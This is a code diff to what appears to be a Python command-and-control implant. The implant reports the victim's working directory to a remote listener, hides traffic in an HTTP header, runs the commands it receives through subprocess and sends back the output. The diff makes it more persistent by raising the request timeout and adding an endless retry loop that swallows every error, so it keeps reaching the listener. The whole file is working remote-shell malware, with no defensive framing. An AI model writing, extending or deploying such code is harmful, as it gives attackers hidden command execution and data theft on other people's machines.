@@ -11,7 +11,7 @@ from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME
 
 # Time in seconds to wait for a http response before a timeout occurs.
 # This time should be long, to give user ample time to input their commands into the listener. 
-REQUEST_TIMEOUT = 60
+REQUEST_TIMEOUT = 300
 # The URL of the listener
 LISTENER_ROOT_URL = f'http://{LISTENER_IP}:{LISTENER_PORT}'
 
@@ -68,7 +68,13 @@ def send_stego_data_to_listener(data: str):
         STEGO_HEADER_NAME: compress_and_encode_string(data)
     }
     url = get_random_url()
-    response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
+    response = None
+    # Keep attempting to request the listener until a response is received.
+    while (response is None):
+        try:
+            response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
+        except:
+            continue
     # for now, listener reply is simply stored in the response text
     # TODO: store it via image steganoraphy
     return response.text
@@ -97,10 +103,11 @@ def execute_command_line_input(input: str):
     else:
         # Execute the command and retrieve the output (might be an error message if command couldn't execute)
         output = subprocess.getoutput(input)
+        print(f"OUTPUT: {output}")
     return output
 
 def main():
-    # First message to listener sends current working directory.
+    # First message to listener contains the current working directory.
     command_line_output = os.getcwd()
     while (True):
         '''
